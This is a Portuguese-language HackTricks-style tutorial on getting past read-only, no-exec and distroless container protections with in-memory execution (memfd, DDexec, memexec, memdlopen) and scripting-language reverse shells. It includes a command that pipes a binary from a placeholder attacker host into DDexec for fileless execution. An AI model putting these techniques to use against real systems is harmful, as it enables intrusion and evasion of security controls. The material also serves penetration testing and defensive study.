# Bypass de proteções do FS: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Vídeos

Nos vídeos a seguir você encontra as técnicas mencionadas nesta página explicadas em mais detalhe:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## Cenário read-only / no-exec

Está cada vez mais comum encontrar máquinas linux montadas com proteção de sistema de arquivos **read-only (ro)**, especialmente em containers. Isso porque rodar um container com sistema de arquivos ro é tão simples quanto definir **`readOnlyRootFilesystem: true`** no `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Entretanto, mesmo que o sistema de arquivos esteja montado como ro, **`/dev/shm`** ainda será gravável, então não é verdade que não podemos escrever nada no disco. Contudo, essa pasta será **montada com no-exec protection**, portanto se você baixar um binário aqui você **não poderá executá-lo**.

> [!WARNING]
> Do ponto de vista de red team, isso torna **complicado baixar e executar** binários que não estão já no sistema (como backdoors ou ferramentas de enumeração como `kubectl`).

## Bypass mais fácil: Scripts

Observe que eu mencionei binários: você pode **executar qualquer script** desde que o interpretador exista na máquina, por exemplo um **shell script** se `sh` estiver presente, ou um **python** **script** se `python` estiver instalado.

No entanto, isso não é suficiente para executar seu backdoor binário ou outras ferramentas binárias que você possa precisar rodar.

## Bypasses de memória

Se você quer executar um binário mas o sistema de arquivos não permite, a melhor forma é **executá-lo a partir da memória**, pois as **proteções não se aplicam lá**.

### FD + exec syscall bypass

Se você tem engines de script poderosas na máquina, como **Python**, **Perl**, ou **Ruby** você pode baixar o binário para executar a partir da memória, armazená-lo em um descritor de arquivo em memória (`create_memfd` syscall), que não será protegido por essas proteções e então chamar um **`exec` syscall** indicando o **fd como o arquivo a executar**.

Para isso você pode usar facilmente o projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Você pode passar um binário e ele vai gerar um script na linguagem indicada com o **binário comprimido e b64 encoded** com as instruções para **decode and decompress it** em um **fd** criado chamando `create_memfd` syscall e uma chamada ao **exec** syscall para executá-lo.

> [!WARNING]
> This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
>
> Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) é uma técnica que permite **modificar a memória do próprio processo** sobrescrevendo seu **`/proc/self/mem`**.

Portanto, **controlando o código assembly** que está sendo executado pelo processo, você pode escrever um **shellcode** e "mutar" o processo para **executar qualquer código arbitrário**.

> [!TIP]
> **DDexec / EverythingExec** permitirá que você carregue e **execute** seu próprio **shellcode** ou **qualquer binário** a partir da **memória**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para mais informações sobre esta técnica verifique o Github ou:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) é o próximo passo natural do DDexec. É um **DDexec shellcode demonised**, então toda vez que você quiser **executar um binário diferente** não precisa relançar o DDexec; pode simplesmente executar o shellcode do memexec via a técnica DDexec e depois **comunicar com esse daemon para enviar novos binários para carregar e executar**.

Você pode encontrar um exemplo de como usar o **memexec para executar binários a partir de um PHP reverse shell** em [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Com um propósito similar ao DDexec, a técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite uma **forma mais fácil de carregar binários** na memória para posteriormente executá-los. Pode até permitir carregar binários com dependências.

## Distroless Bypass

Para uma explicação dedicada sobre **o que Distroless realmente é**, quando ajuda, quando não ajuda, e como altera a tradecraft de pós-exploração em containers, confira:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### O que é Distroless

Containers Distroless contêm apenas os **componentes mínimos necessários para executar uma aplicação ou serviço específico**, como bibliotecas e dependências de runtime, mas excluem componentes maiores como um gerenciador de pacotes, `shell`, ou utilitários do sistema.

O objetivo dos containers Distroless é **reduzir a superfície de ataque dos containers eliminando componentes desnecessários** e minimizando o número de vulnerabilidades que podem ser exploradas.

### Reverse Shell

Em um container Distroless você pode **nem encontrar `sh` ou `bash`** para obter um shell regular. Também não encontrará binários como `ls`, `whoami`, `id`... tudo que você normalmente executa em um sistema.

> [!WARNING]
> Portanto, você **não** poderá obter um **reverse shell** nem **enumerar** o sistema como costuma fazer.

No entanto, se o container comprometido estiver executando, por exemplo, uma aplicação Flask, então Python está instalado e, portanto, você pode obter um **Python reverse shell**. Se estiver executando Node, você pode obter um Node rev shell, e o mesmo vale para praticamente qualquer **linguagem de script**.

> [!TIP]
> Usando a linguagem de script você pode **enumerar o sistema** usando as capacidades da linguagem.

Se não houver proteções **`read-only/no-exec`** você poderia abusar do seu reverse shell para **gravar no sistema de arquivos seus binários** e **executá-los**.

> [!TIP]
> No entanto, nesse tipo de containers essas proteções normalmente existem, mas você pode usar as **técnicas de execução em memória anteriores para contorná-las**.

Você pode encontrar **exemplos** de como **explorar algumas vulnerabilidades RCE** para obter **reverse shells** em linguagens de script e executar binários a partir da memória em [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
